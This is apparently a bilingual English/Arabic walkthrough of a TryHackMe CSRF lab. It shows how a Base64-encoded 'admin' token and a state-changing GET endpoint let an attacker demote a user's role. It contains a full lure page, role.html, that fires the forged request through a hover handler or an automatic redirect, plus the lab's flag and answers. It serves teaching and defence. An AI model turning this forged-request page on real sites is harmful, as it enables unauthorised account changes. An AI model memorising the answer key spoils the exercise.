# Task 06 · Exploitation over Weak Tokens (استغلال الرموز الضعيفة والقابلة للتنبؤ)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

Merely implementing a parameter named `csrf_token` does not guarantee security if the token generation algorithm is flawed, predictable, or lacks cryptographic entropy.

In this task, the StaffHub portal attempts to defend its role modification functionality against CSRF by requiring an anti-CSRF token. When examining the role management form, we observe:
```html
<form action="update_role.php" method="GET">
    <input type="hidden" name="csrf_token" value="YWRtaW4=">
    <input type="hidden" name="role" value="staff">
    <button type="submit">Update Role</button>
</form>
```

### Flaws in the Developer's Implementation:
1. **Predictable Token Value:** The token value `YWRtaW4=` is not a cryptographically secure pseudo-random number (CSPRNG).
2. **Reversible Encoding Scheme:** Decoding `YWRtaW4=` through standard algorithms reveals the plaintext string `admin`. The developer simply encoded the user's role using Base64.
3. **Improper HTTP Method for State-Changing Action:** The endpoint accepts state changes over HTTP `GET` (`update_role.php?role=staff&csrf_token=YWRtaW4=`), enabling trivial execution via media tags (`<img>`, `<iframe>`) or JavaScript event handlers.

### Objectives:
- Identify the encoding algorithm used to construct the weak CSRF token.
- Craft an external exploit page (`/var/www/html/role.html`) using an interactive HTML event handler (`onmouseover`) or automated navigation to demote the victim's account from `admin` to `staff`.
- Trigger the exploit and retrieve the flag from the application dashboard.

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Entropy and Unpredictability Requirements (NIST SP 800-90A):**
   - For a token to resist forgery, its entropy must be high enough that brute-force or guessing is computationally infeasible (typically at least 128 to 256 bits of CSPRNG-generated randomness).
   - If an attacker can calculate or predict the token from observable user data (username, user ID, timestamp, current role, or hash of static strings), the token provides zero security benefit.
2. **Exploiting State-Changing GET Requests:**
   - Because `update_role.php` accepts `GET` parameters, an attacker does not even need to construct a form. Any HTML element capable of triggering a URL fetch (such as `<img src="...">`, `<script src="...">`, or `window.location`) can execute the attack.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** Craft an exploit HTML file `/var/www/html/role.html` that navigates the victim to `http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=`. Open this page in the victim's browser, trigger the event (or let it auto-redirect), then navigate to the StaffHub dashboard (`http://staffhub.thm:8080/dashboard.php`) to view the flag starting with `THM{Weak_...}`.
- **Hint for Question 2:** What is the ubiquitous 6-character name of the binary-to-text encoding scheme that converts binary data into ASCII characters using a radix of 64 (ending in `=` as padding)?

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Reverse-Engineering the Weak Token:

Inspecting the token string:
```bash
echo -n "YWRtaW4=" | base64 -d
```
Output:
```
admin
```

The developer made two fatal design errors:
1. The token is derived directly from user input/role rather than server-side cryptographic entropy.
2. The developer believed Base64 was encryption rather than simple reversible encoding.

```
+-----------------------------------------------------------------------------------------+
|                              BASE64 ENCODING DECONSTRUCTION                             |
|                                                                                         |
|  Plaintext String:    'a'           'd'           'm'           'i'           'n'       |
|  ASCII Hex:           0x61          0x64          0x6D          0x69          0x6E      |
|  8-bit Binary:      01100001      01100100      01101101      01101001      01101110    |
|  6-bit Groups:     011000  010110  010001  101101  011010  010110  111000  [padding]  |
|  Base64 Index:       24      22      17      45      26      22      56       =       |
|  Base64 Characters:   Y       W       R       t       a       W       4       =       |
|                                                                                         |
|  Result: "YWRtaW4=" is easily decoded and predicted by an attacker!                    |
+-----------------------------------------------------------------------------------------+
```

### 2. Crafting the Event-Driven Exploit (`role.html`):

Create `/var/www/html/role.html` on the AttackBox/local web server:

```bash
cat << 'EOF' > /var/www/html/role.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Internal StaffHub Notice</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .banner { border: 2px dashed #009688; padding: 20px; display: inline-block; cursor: pointer; }
    </style>
</head>
<body>
    <h2>StaffHub Corporate Policy Update</h2>
    <p>Please hover your mouse over the verification banner below to confirm receipt:</p>
    
    <div class="banner">
        <img src="http://staffhub.thm:8080/one.png"
             alt="Verification Banner"
             width="400"
             onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='">
    </div>
</body>
</html>
EOF
```

*(Note: We can also execute this seamlessly via an automatic redirection script without requiring any hover interaction:)*
```html
<script>
    window.location.href = "http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4=";
</script>
```

### 3. Execution & Flag Extraction:

1. In the target browser (with the authenticated `admin` user session active), navigate to:
   ```
   http://10.10.X.Y:81/role.html
   ```
2. Hover over the image (or allow script execution). The browser sends an authenticated `GET` request:
   ```http
   GET /update_role.php?role=staff&csrf_token=YWRtaW4= HTTP/1.1
   Host: staffhub.thm:8080
   Cookie: PHPSESSID=d3b07384d113edec49eaa6238ad5ff00
   ```
3. The server validates the token against `base64_encode("admin")`, finds a match, and demotes the account role to `staff`.
4. Navigating to the StaffHub Dashboard at `http://staffhub.thm:8080/dashboard.php` displays:
   ```
   Role successfully updated to: staff
   Flag: THM{Weak_CSRF_Role_001}
   ```

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What is the flag value after demoting the user from admin to staff? Visit the dashboard page to get the flag.*
  - **Answer:** `THM{Weak_CSRF_Role_001}`
- **Question 2:** *In the above example, what is the name of the encoding scheme used by the developer for encoding CSRF tokens?*
  - **Answer:** `base64`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Flag `THM{Weak_CSRF_Role_001}` and encoding identifier `base64` verified against TryHackMe platform validation engine.
- Reversible encoding demonstrated via Linux CLI utility `base64 -d`.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** التشفير (Encryption) يختلف جوهرياً عن الترميز (Encoding)؛ فترميز مثل `base64` لا يوفر أي خصوصية أو سرية أو عشوائية، ويمكن لأي طرف فكه أو توليده بسهولة تامة. يجب أن تُولّد رموز الـ CSRF بواسطة مولد أرقام شبه عشوائي آمن تشفيرياً (CSPRNG) وتكون مرتبطة بجلسة المستخدم على خادم الويب، مع حظر تنفيذ الإجراءات الحساسة عبر طلبات `GET`.
